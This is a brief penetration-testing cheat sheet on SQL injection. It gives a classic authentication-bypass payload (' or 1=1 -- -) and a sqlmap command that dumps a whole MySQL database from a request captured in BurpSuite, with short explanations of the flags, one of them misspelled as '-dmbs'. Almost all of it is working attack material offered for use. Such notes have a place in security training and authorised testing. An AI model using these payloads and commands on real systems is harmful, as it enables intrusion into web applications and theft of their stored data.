## Basic SQL Injection
```bash
' or 1=1 -- -
```

## Use sqlmap to dump a database
_sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers._

```bash
sqlmap -r <text.txt> --dbms=mysql --dump
```

- -r use a request intercept with BurpSuite (search request per exemple) 
- -dmbs tells SQLMap what type of database management system it is
- -dump attempts to outputs the entire database
